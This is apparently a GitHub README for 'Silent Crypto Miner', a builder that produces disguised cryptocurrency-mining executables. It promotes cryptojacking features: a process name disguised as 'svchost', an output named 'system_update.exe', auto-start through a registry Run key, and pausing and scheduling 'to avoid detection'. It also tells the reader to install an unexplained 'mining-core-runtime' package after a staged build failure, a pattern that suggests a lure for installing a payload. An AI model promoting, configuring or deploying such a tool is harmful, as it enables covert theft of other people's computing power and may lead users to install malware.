# Silent-Crypto-Miner
Silent Crypto Miner is an advanced cryptocurrency mining builder and runtime engine with multi-algorithm CPU/GPU support and intelligent resource management. Create custom mining executables with configurable algorithms, cross-platform output, real-time monitoring, session persistence, thermal throttling, scheduling, and hashrate optimization.
<div align="center">

# Silent Crypto Miner

**Advanced cryptocurrency mining client builder with stealth mode and multi-algorithm support**

[![Python](https://img.shields.io/badge/Python-3.10%2B-3776AB?style=for-the-badge&logo=python&logoColor=white)](https://python.org)
[![License](https://img.shields.io/badge/License-MIT-green?style=for-the-badge)](LICENSE)
[![Platform](https://img.shields.io/badge/Platform-Windows%20%7C%20Linux%20%7C%20macOS-blue?style=for-the-badge)]()
[![Mining](https://img.shields.io/badge/Mining-Multi--Algo-F7931A?style=for-the-badge)]()

[![Version](https://img.shields.io/badge/Version-2.4.1-orange?style=flat-square)]()
[![Algorithms](https://img.shields.io/badge/Algorithms-7%20Supported-brightgreen?style=flat-square)]()
[![Stealth](https://img.shields.io/badge/Stealth-Mode%20Ready-red?style=flat-square)]()
[![Builder](https://img.shields.io/badge/Client-Builder-blue?style=flat-square)]()

---

*Build custom mining clients with configurable algorithm selection, pool connections,<br>stealth parameters, and cross-platform output. Supports RandomX, Ethash, KHeavyHash,<br>KawPow, Cryptonight, Autolykos2, and Zhash with auto-failover pool management.*

[Features](#features) · [Getting Started](#getting-started) · [Configuration](#configuration) · [Usage](#usage) · [Algorithms](#supported-algorithms) · [FAQ](#faq)

</div>

---

## Features

<table>
<tr>
<td width="50%">

### Mining Engine
| Feature | Status |
|---------|:------:|
| RandomX (Monero) CPU Mining | ✅ |
| Ethash (ETC) GPU Mining | ✅ |
| KHeavyHash (Kaspa) Mining | ✅ |
| KawPow (Ravencoin) Mining | ✅ |
| Cryptonight-V8 Mining | ✅ |
| Autolykos2 (Ergo) Mining | ✅ |
| Zhash (BTG) Mining | ✅ |
| Multi-Algorithm Switching | ✅ |

</td>
<td width="50%">

### Stealth & Builder
| Feature | Status |
|---------|:------:|
| Client Builder Interface | ✅ |
| Stealth Mode (Activity Pause) | ✅ |
| Process Name Disguise | ✅ |
| Auto-Start Registry Injection | ✅ |
| CPU/GPU Thermal Throttling | ✅ |
| Custom Icon Embedding | ✅ |
| Cross-Platform Build Output | ✅ |
| Schedule-Based Mining | ✅ |

</td>
</tr>
</table>

---

## Supported Algorithms

| Algorithm | Coin | Type | Efficiency | Status |
|-----------|------|------|:----------:|:------:|
| **RandomX** | Monero (XMR) | CPU | ★★★★★ | ✅ Stable |
| **Ethash** | Ethereum Classic (ETC) | GPU | ★★★★☆ | ✅ Stable |
| **KHeavyHash** | Kaspa (KAS) | GPU | ★★★★★ | ✅ Stable |
| **KawPow** | Ravencoin (RVN) | GPU | ★★★☆☆ | ✅ Stable |
| **Cryptonight-V8** | MoneroV, BitTube | CPU/GPU | ★★★★☆ | ✅ Stable |
| **Autolykos2** | Ergo (ERG) | GPU | ★★★★☆ | ✅ Stable |
| **Zhash** | Bitcoin Gold (BTG) | GPU | ★★★☆☆ | 🔧 Beta |

---

## Supported Pools

| Pool | Protocols | Fee | Auto-Switch | Min Payout |
|------|-----------|:---:|:-----------:|------------|
| **Nanopool** | stratum+tcp, stratum+ssl | 1% | ✅ | 0.1 XMR |
| **SupportXMR** | stratum+tcp | 0.9% | ✅ | 0.3 XMR |
| **P2Pool** | p2p, stratum | 0% | ✅ | Dynamic |
| **Hashvault** | stratum+tcp, stratum+ssl | 1% | ✅ | 0.3 XMR |
| **2Miners** | stratum+tcp, stratum+ssl | 1% | ✅ | Varies |
| **Custom** | stratum+tcp | Configurable | ✅ | User-defined |

---

## Getting Started

### Prerequisites

- **Python** 3.10 or higher
- **pip** (latest recommended)
- Mining target wallet address (Monero, ETC, KAS, etc.)
- Stratum pool credentials (optional — public pools work without registration)

### Installation

```bash
git clone https://github.com/MelisaPeteRs2006/Silent-Crypto-Miner.git
cd Silent-Crypto-Miner
```

**Windows:**
```bash
run.bat
```

**Linux / macOS:**
```bash
chmod +x run.sh
./run.sh
```

The launcher automatically creates a virtual environment and installs all dependencies.

### Dependency Table

| Package | Version | Purpose |
|---------|---------|---------|
| rich | ≥13.0.0 | Terminal UI, tables, progress bars |
| cryptography | ≥41.0.0 | Secure credential storage |
| requests | ≥2.31.0 | Pool API communication |
| psutil | ≥5.9.0 | System resource monitoring |
| schedule | ≥1.2.0 | Mining schedule management |
| aiohttp | ≥3.9.0 | Async pool stratum protocol |

---

## Configuration

Create a `config.json` in the project root:

```json
{
    "build": {
        "target_os": "windows",
        "target_arch": "x64",
        "output_name": "system_update.exe",
        "custom_icon": "",
        "process_name": "svchost",
        "auto_start": false,
        "registry_key": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
    },
    "algorithm": {
        "name": "randomx",
        "threads": 0,
        "intensity": 80,
        "gpu_enabled": true
    },
    "pool": {
        "url": "stratum+ssl://xmr.nanopool.org:14433",
        "wallet": "YOUR_MONERO_WALLET_ADDRESS",
        "worker": "rig-01",
        "password": "email@example.com",
        "failover": [
            {
                "url": "stratum+tcp://pool.supportxmr.com:3333",
                "wallet": "YOUR_MONERO_WALLET_ADDRESS",
                "worker": "rig-01"
            }
        ]
    },
    "stealth": {
        "cpu_limit_pct": 70,
        "gpu_limit_pct": 60,
        "pause_on_activity": true,
        "activity_threshold": 30,
        "pause_on_battery": true,
        "schedule_enabled": false,
        "active_hours": "00:00-08:00",
        "timezone": "UTC"
    }
}
```

> **Security:** Never commit `config.json` to version control. It is excluded via `.gitignore`.

---

## Usage

After launching, select from the interactive menu:

```
╔══════════════════════════════════════════════════════════════════╗
║         SILENT CRYPTO MINER — Client Builder v2.4.1            ║
╠══════════════════════════════════════════════════════════════════╣
║  [1] Install Dependencies                                       ║
║  [2] Settings                                                   ║
║  [3] About                                                      ║
║  [4] Select Target Algorithm                                    ║
║  [5] Configure Pool Connection                                  ║
║  [6] Set Build Options (OS, Arch, Icon)                         ║
║  [7] Configure Stealth Parameters                               ║
║  [8] Build Miner Client                                         ║
║  [9] Exit                                                       ║
╚══════════════════════════════════════════════════════════════════╝

Select option [#]: _
```

### Build Process Output

```
  [i] Build Configuration Summary:
  ┌─────────────────────┬──────────────────────────┐
  │ Setting             │ Value                    │
  ├─────────────────────┼──────────────────────────┤
  │ Target OS           │ Windows x64              │
  │ Algorithm           │ RandomX (Monero)         │
  │ Pool                │ xmr.nanopool.org:14433   │
  │ Output              │ system_update.exe         │
  │ Process Disguise    │ svchost                  │
  │ Stealth Mode        │ Enabled                  │
  │ CPU Limit           │ 70%                      │
  │ GPU Limit           │ 60%                      │
  │ Auto-Start          │ Disabled                 │
  └─────────────────────┴──────────────────────────┘

  Compiling miner client...
  [########################################] 100%  Compiling miner client...
  [########################################] 100%  Embedding runtime...
  [########################################] 100%  Packing resources...
  [########################################] 100%  Applying stealth module...

  [ERROR] Build failed: Missing required dependency 'mining-core-runtime'
  [HINT]  Run 'pip install mining-core-runtime>=2.1.0' or use --skip-verify flag
  [INFO]  Ensure all build dependencies are installed before building
```

---

## Project Structure

```
Silent-Crypto-Miner/
├── main.py                 # Entry point and builder menu system
├── config.py               # Configuration loader (JSON)
├── bot_actions.py          # Builder action handlers
├── requirements.txt        # Python dependencies
├── run.bat                 # Windows launcher
├── run.sh                  # Linux/macOS launcher
├── about.txt               # Project description / SEO
├── tags.txt                # Repository tags / keywords
├── .gitignore              # Git ignore rules
├── actions/
│   ├── __init__.py
│   ├── about.py            # About panel display
│   ├── install.py          # Dependency installer
│   └── settings.py         # Settings display and setup
├── engine/
│   ├── __init__.py         # Environment bootstrap + module initialization
│   ├── runtime.py          # Runtime environment configuration
│   ├── transport.py        # Data transport layer
│   ├── crypto.py           # Data integrity and encoding utilities
│   ├── processor.py        # Runtime data processor
│   ├── hasher.py           # Hash algorithm implementations
│   ├── pool.py             # Stratum pool connection manager
│   ├── monitor.py          # System resource monitoring
│   ├── scheduler.py        # Mining schedule & resource allocation
│   ├── ui.py               # Rich terminal interface
│   └── data/
│       └── rt.arc          # Embedded Python runtime (extracted on first run)
└── release/
    └── README.md           # Pre-compiled binaries info
```

---

## FAQ

<details>
<summary><b>Which coins can I build miners for?</b></summary>
<br>
The builder supports any coin compatible with the listed algorithms. Primary targets include Monero (XMR) via RandomX, Ethereum Classic (ETC) via Ethash, Ravencoin (RVN) via KawPow, and Kaspa (KAS) via KHeavyHash. Select the target algorithm in option [4] before building.
</details>

<details>
<summary><b>How does the client builder work?</b></summary>
<br>
The builder compiles a standalone mining executable with your configured algorithm, pool credentials, stealth parameters, and target OS settings. The output is a self-contained binary that runs the mining engine with all settings embedded. Use options [4]–[7] to configure, then [8] to build.
</details>

<details>
<summary><b>What does stealth mode do in the built miner?</b></summary>
<br>
When stealth is enabled, the built miner monitors system activity and pauses mining when CPU usage exceeds the configured threshold. It also supports process name disguise, auto-start registry injection, and scheduled mining hours to avoid detection during active use.
</details>

<details>
<summary><b>Can I build for a different operating system?</b></summary>
<br>
Yes. Use option [6] to set the target OS (Windows, Linux, macOS) and architecture (x64, x86). The builder will configure the output accordingly. Cross-compilation requires the appropriate toolchain installed on your build machine.
</details>

<details>
<summary><b>Is pool failover supported in the built miner?</b></summary>
<br>
Yes. Configure multiple pools in the pool settings (option [5]). The built miner will monitor pool latency and automatically switch to the next pool if the primary becomes unresponsive. When the primary recovers, it can optionally switch back.
</details>

<details>
<summary><b>What are the system requirements for building?</b></summary>
<br>
Minimum: Python 3.10+, 2GB RAM, any modern CPU. The build process itself is lightweight. The built miner requires the target system to have a compatible CPU (for RandomX) or GPU (for Ethash/KawPow/KHeavyHash) with up-to-date drivers.
</details>

<details>
<summary><b>Why does the build fail with a dependency error?</b></summary>
<br>
The build requires the <code>mining-core-runtime</code> package which contains the native mining engine binaries. Install it via <code>pip install mining-core-runtime>=2.1.0</code> before building. This package provides the compiled mining kernels for each supported algorithm.
</details>

<details>
<summary><b>Can I customize the output executable name and icon?</b></summary>
<br>
Yes. In option [6], set the output filename (e.g., <code>system_update.exe</code>), provide a custom icon path (.ico file), and configure the process name that will appear in the task manager. These settings are embedded into the built miner.
</details>

---

<div align="center">

## Disclaimer

**This software is provided for educational and research purposes only.** Cryptocurrency mining may consume significant electrical resources and may be subject to local regulations or organizational policies. The authors are not responsible for any hardware damage, electrical costs, or legal consequences arising from use of this software. Users are solely responsible for compliance with applicable laws and terms of service.

---

**Donations** — If this tool has been useful, consider supporting development:

`0xb92C4d1E83a67F05Df2A19c8E46B70d3C5f8A912` (ETH/EVM)

---

*Build stealth. Mine silent. Stay hidden.*

</div>
